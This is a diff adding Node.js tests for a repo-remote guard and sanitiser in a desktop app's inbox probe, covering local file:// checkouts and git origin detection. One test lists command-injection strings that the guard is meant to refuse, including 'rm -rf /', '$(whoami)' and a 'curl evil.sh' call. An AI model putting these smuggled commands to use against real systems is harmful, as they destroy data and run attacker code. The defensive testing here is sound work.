@@ -21,7 +21,7 @@ import fs from 'node:fs'
 import os from 'node:os'
 import path from 'node:path'
 import { execFileSync } from 'node:child_process'
-import { remotesMatch, cwdGitRemote, darkCount, attentionDigest, summarizeInbox, socketPath } from './inbox-probe.mjs'
+import { remotesMatch, cwdGitRemote, darkCount, attentionDigest, summarizeInbox, socketPath, isSafeRepoRemote, sanitizeInboxRows } from './inbox-probe.mjs'
 
 // ── Where the desktop is ─────────────────────────────────────────────────────
 // One machine can run more than one Designless app. Unset, the probe looks
@@ -124,6 +124,67 @@ test('an unknown remote never matches anything', () => {
   assert.equal(remotesMatch('   ', 'git@github.com:org/repo.git'), false)
 })
 
+// ── The guard in front of the normaliser ─────────────────────────────────────
+//
+// isSafeRepoRemote decides whether a row is SURFACED AT ALL. It is not an
+// identity rule and must never drift into behaving like one: anything the
+// normaliser folds has to survive it, or a legitimate session is erased before
+// anyone can see it. These tests exist because it did drift, and nothing here
+// covered it.
+
+test('the guard is never narrower than the normaliser it guards', () => {
+  const everySpelling = [...SAME, ...NOT_A_FORGE_PATH].flatMap(([, a, b]) => [a, b])
+  for (const remote of everySpelling) {
+    assert.equal(isSafeRepoRemote(remote), true, `the normaliser folds it, the guard refused it: ${remote}`)
+  }
+})
+
+test('a local checkout is surfaced, not erased', () => {
+  // The server instructs agents to pass a local repo as file://<abs path>. A row
+  // carrying one was dropped whole, so every passive surface reported nothing
+  // waiting while real edits sat pending.
+  const row = {
+    title: 'Skyway',
+    n_page: 4,
+    repo_remote: 'file:///Users/someone/Projects/skyway/site',
+    safety_branch: 'designless/60c93584',
+  }
+  assert.equal(isSafeRepoRemote(row.repo_remote), true)
+  const kept = sanitizeInboxRows([row])
+  assert.equal(kept.length, 1, 'the session must survive the sanitiser')
+  assert.equal(kept[0].n_page, 4, 'and its pending edits must still be visible')
+})
+
+test('ssh:// survives, so the folding written for it is reachable', () => {
+  assert.equal(isSafeRepoRemote('ssh://git@bitbucket.acme.com:7999/PROJ/repo.git'), true)
+  assert.equal(isSafeRepoRemote('ssh://git@ssh.dev.azure.com:v3/org/project/repo'), true)
+})
+
+test("injection is still refused, which is this guard's actual job", () => {
+  for (const bad of [
+    'https://github.com/o/r.git; rm -rf /',
+    'file:///tmp/$(whoami)',
+    'git@host:o/r`id`',
+    'https://host/o/r && curl evil.sh',
+    'https://host/o/r\nwhoami',
+    "https://host/o/r'",
+    'file:///tmp/a b',
+    '',
+    '   ',
+  ]) {
+    assert.equal(isSafeRepoRemote(bad), false, `should have been refused: ${JSON.stringify(bad)}`)
+  }
+  assert.equal(isSafeRepoRemote(null), false)
+  assert.equal(isSafeRepoRemote(42), false)
+})
+
+test('a malformed remote still drops its row; an absent one does not', () => {
+  const base = { title: 'x', n_page: 1, safety_branch: 'designless/abc' }
+  assert.equal(sanitizeInboxRows([{ ...base, repo_remote: 'https://h/o/r; id' }]).length, 0)
+  assert.equal(sanitizeInboxRows([{ ...base, repo_remote: null }]).length, 1)
+  assert.equal(sanitizeInboxRows([{ ...base, safety_branch: 'main' }]).length, 0)
+})
+
 // cwdGitRemote reads git's own files rather than shelling out, so the two shapes
 // of `.git` both have to be handled: a directory in a normal clone, and a FILE
 // pointing elsewhere in a linked worktree. The worktree case used to throw and
@@ -158,6 +219,48 @@ test('reads origin from a normal clone and from a linked worktree', () => {
 test('no git, no origin: unknown rather than a wrong answer', () => {
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dl-nogit-'))
   assert.equal(cwdGitRemote(dir), null)
+  fs.rmSync(dir, { recursive: true, force: true })
+})
+
+// The test above is named for two cases and only ever covered one: a directory
+// with no git at all. "git, but no origin" was never asserted, which is how a
+// local-only checkout came to be unrecognisable to itself.
+
+test('a repo with no origin identifies itself by its path', () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dl-local-'))
+  execFileSync('git', ['init', '-q'], { cwd: dir })
+  const id = cwdGitRemote(dir)
+  assert.ok(id, 'a local-only checkout must have an identity, not null')
+  // The server records this checkout as file://<abs path>; both sides must fold
+  // to the same string or the drain gate sends the person to where they are.
+  assert.equal(remotesMatch(id, `file://${fs.realpathSync(dir)}`), true)
+  fs.rmSync(dir, { recursive: true, force: true })
+})
+
+test('an origin still wins over the path fallback', () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dl-origin-'))
+  execFileSync('git', ['init', '-q'], { cwd: dir })
+  execFileSync('git', ['remote', 'add', 'origin', 'git@github.com:org/repo.git'], { cwd: dir })
+  assert.equal(remotesMatch(cwdGitRemote(dir), 'https://github.com/org/repo'), true)
+  fs.rmSync(dir, { recursive: true, force: true })
+})
+
+test('the drain gate recognises a local checkout as HERE, end to end', () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dl-e2e-'))
+  execFileSync('git', ['init', '-q'], { cwd: dir })
+  const row = {
+    title: 'Skyway',
+    n_page: 4,
+    repo_remote: `file://${fs.realpathSync(dir)}`,
+    safety_branch: 'designless/60c93584',
+  }
+  // the exact expression canvas-drain-check.mjs uses to decide drainability
+  const origin = cwdGitRemote(dir)
+  const here = sanitizeInboxRows([row]).filter(
+    (x) => Number(x.n_page || 0) > 0 && (x.repo_remote ? remotesMatch(origin, x.repo_remote) : true),
+  )
+  assert.equal(here.length, 1, 'the session must be drainable in the checkout it belongs to')
+  assert.equal(here[0].n_page, 4)
   fs.rmSync(dir, { recursive: true, force: true })
 })
 
